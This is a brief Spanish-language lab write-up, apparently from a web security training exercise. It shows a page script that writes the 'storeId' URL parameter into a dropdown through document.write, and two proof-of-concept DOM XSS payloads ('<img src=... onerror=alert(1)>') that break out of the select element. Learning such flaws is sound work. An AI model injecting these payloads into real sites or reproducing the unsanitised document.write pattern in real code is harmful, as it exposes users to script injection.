Al entrar en un producto y analizar el codigo de la página nos escontramos con un script:

```
<script>
                                var stores = ["London","Paris","Milan"];
                                var store = (new URLSearchParams(window.location.search)).get('storeId');
                                document.write('<select name="storeId">');
                                if(store) {
                                    document.write('<option selected>'+store+'</option>');
                                }
                                for(var i=0;i<stores.length;i++) {
                                    if(stores[i] === store) {
                                        continue;
                                    }
                                    document.write('<option>'+stores[i]+'</option>');
                                }
                                document.write('</select>');
                            </script>
```

Vemos la existencia de un parámetro storeId. 

Si a la uri le añadimos por ejemplo "&storeId=abc8", en el desplegable sale la opción abc8 en modo selected como si fuera una ciudad cualquiera. Es decir, que podemos poner en ese campo lo que queramos. 

Entonces si yo pongo:
```
&storeId="<img src=noexiste onerror=alert(1)>
```
Se quedará en el desplegable un valor " y saltará una alerta.


También se podría haber puesto:
```
"></select><img%20src=1%20onerror=alert(1)>
```
